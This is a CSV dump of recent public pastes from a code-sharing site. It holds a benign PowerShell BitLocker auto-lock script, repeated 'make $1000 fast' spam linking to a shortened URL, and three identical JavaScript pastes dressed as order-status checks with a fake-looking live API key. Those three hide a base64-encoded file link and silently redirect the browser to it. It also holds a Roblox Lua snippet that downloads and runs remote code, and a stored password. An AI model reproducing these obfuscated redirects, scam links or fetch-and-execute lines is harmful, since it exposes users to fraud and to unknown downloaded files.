id,title,username,language,date,content
LSC1CfZ8,AutoLock VHD,Nom1fan,PowerShell,Friday 11th of April 2025 07:03:01 AM CDT,"$driveLetter = ""V:""  # Set your drive letter here
$idleMinutes = 1
$idleThreshold = $idleMinutes * 60

# Define native method for idle detection
Add-Type @""
using System;
using System.Runtime.InteropServices;

public static class IdleTime {
    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }

    [DllImport(""user32.dll"")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    public static int GetIdleTimeInSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) {
            return 0;
        }
        return (Environment.TickCount - (int)lii.dwTime) / 1000;
    }
}
""@

function Get-IdleTime {
    return [IdleTime]::GetIdleTimeInSeconds()
}

Write-Host ""Auto-lock script running. Will lock $driveLetter after $idleMinutes minutes of inactivity.""

while ($true) {
    $idleTime = Get-IdleTime
    Write-Host ""Idle time: $idleTime seconds""

    if ($idleTime -ge $idleThreshold) {
        Write-Host ""Idle for $idleTime seconds. Locking drive $driveLetter...""
        manage-bde -lock $driveLetter -ForceDismount

        # Wait for some activity before continuing (reset loop after user returns)
        do {
            Start-Sleep -Seconds 10
            $idleTime = Get-IdleTime
        } while ($idleTime -ge 30)

        Write-Host ""User activity detected. Resuming idle monitoring...""
    }

    Start-Sleep -Seconds 30
}
"
mKZktgHT,Make $1000 15-MINUTES (BEGINNER) FM,HUSSAM54335,JavaScript,Friday 11th of April 2025 07:01:39 AM CDT," 
Pdf https://tinyurl.com/privguidee


jtfk2EOqp4
"
BfhFrYdu,Order.js,dentira,JavaScript,Friday 11th of April 2025 06:53:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06302/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ngY8ibvk,EARN $900 INSTANTLY 2025⭐ G8,HUSSAM54335,JavaScript,Friday 11th of April 2025 06:48:15 AM CDT," 
Pdf https://tinyurl.com/privguidee


JX9DqxT0vk
"
ZSFrgKRF,Market.js,dentira,JavaScript,Friday 11th of April 2025 06:38:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15002/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1XijPqav,Make $1000 15-MINUTES  (BEGINNER) HV,HUSSAM54335,JavaScript,Friday 11th of April 2025 06:34:52 AM CDT," 
Pdf https://tinyurl.com/privguidee


3zt3uMm64D
"
esnTZm2S,Mount RNG,CaptainMars,Lua,Friday 11th of April 2025 06:23:23 AM CDT,"-- Services
local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Workspace = game:GetService(""Workspace"")

-- UI Library (load only once)
local DiscordLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt""))()

-- Constants
local TASK_STATES = {
    INACTIVE = 0,
    ACTIVE = 1,
    PAUSED = 2
}

-- Task System Core
local TaskSystem = {}
TaskSystem.__index = TaskSystem

function TaskSystem.new()
    local self = setmetatable({
        tasks = {},
        activeTask = nil,
        state = TASK_STATES.INACTIVE,
        mainThread = nil,
        ui = {
            window = nil,
            statusLabel = nil
        }
    }, TaskSystem)
    
    self:_initUI()

    return self
end

function TaskSystem:_initUI()
    self.ui.window = DiscordLib:Window(""Advanced Task System"")

    local server = self.ui.window:Server(""Task Manager"", """")

    self.ui.taskChannel = server:Channel(""Tasks"")

    self.ui.statusLabel = self.ui.taskChannel:Label(""Status: Idle"")
    
    self.ui.settingsChannel = server:Channel(""Settings"")

    self.ui.settingsChannel:Label(""Task Priorities:"")
end

TaskSystem.new()"
FKdw6t9W,Untitled,dentira,JavaScript,Friday 11th of April 2025 06:23:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GiQgHEgg,Rakib bhai,Rakibmunshi721,JSON,Friday 11th of April 2025 06:22:57 AM CDT,"{
  ""ModsLabs_Password"": [
    {
      ""password"": ""0000""
    }
  ]
}"
Vfiq5xbn,EARN $900 INSTANTLY 2025 2U,HUSSAM54335,JavaScript,Friday 11th of April 2025 06:21:28 AM CDT," 
Pdf https://tinyurl.com/privguidee


NXz6EFYXez
"
